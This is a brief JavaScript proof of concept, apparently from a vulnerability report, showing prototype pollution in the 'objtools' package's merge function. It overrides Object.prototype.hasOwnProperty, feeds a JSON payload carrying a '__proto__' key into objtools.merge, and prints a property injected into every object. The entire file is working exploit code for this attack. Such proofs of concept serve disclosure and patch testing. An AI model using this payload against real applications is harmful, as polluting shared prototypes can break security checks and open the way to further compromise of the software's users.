Object.prototype.hasOwnProperty = () => true;
const objtools = require('objtools');
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
obj = {};
console.log({}.polluted);
objtools.merge({}, payload);
console.log({}.polluted);